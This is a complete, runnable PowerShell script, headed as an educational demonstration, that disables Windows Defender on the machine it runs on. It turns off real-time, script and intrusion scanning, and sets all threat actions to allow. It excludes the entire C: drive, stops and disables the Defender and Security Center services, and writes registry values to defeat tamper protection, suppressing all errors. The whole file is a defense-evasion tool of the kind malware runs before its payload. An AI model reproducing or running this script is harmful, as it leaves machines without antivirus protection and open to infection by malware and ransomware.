# Warning: Educational demonstration only
# Disables Windows Defender and security features

function Disable-SecurityFeatures {
    try {
        # Disable Real-time Monitoring
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        
        # Disable various security features
        $preferences = @{
            DisableIOAVProtection = $true
            DisableIntrusionPreventionSystem = $true
            DisableScriptScanning = $true
            SubmitSamplesConsent = 2
            MAPSReporting = 0
            HighThreatDefaultAction = 6
            ModerateThreatDefaultAction = 6
            LowThreatDefaultAction = 6
        }
        
        foreach ($pref in $preferences.GetEnumerator()) {
            Set-MpPreference -$($pref.Name) $($pref.Value) -ErrorAction SilentlyContinue
        }
        
        # Add exclusion for entire C drive
        Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
        
        # Disable services
        $services = @(
            "WinDefend",
            "WdNisSvc",
            "SecurityHealthService",
            "wscsvc"
        )
        
        foreach ($service in $services) {
            Stop-Service -Name $service -Force -ErrorAction SilentlyContinue
            Set-Service -Name $service -StartupType Disabled -ErrorAction SilentlyContinue
        }
        
        # Disable tamper protection via registry if possible
        $regPaths = @(
            "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features",
            "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
        )
        
        foreach ($path in $regPaths) {
            if (!(Test-Path $path)) {
                New-Item -Path $path -Force | Out-Null
            }
            Set-ItemProperty -Path $path -Name "TamperProtection" -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
        }
        
        Write-Output "Security features disabled"
        
    } catch {
        Write-Warning "Operation failed: $_"
    }
}

# Check for admin rights
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Warning "Requires administrative privileges"
    exit 1
}

Disable-SecurityFeatures
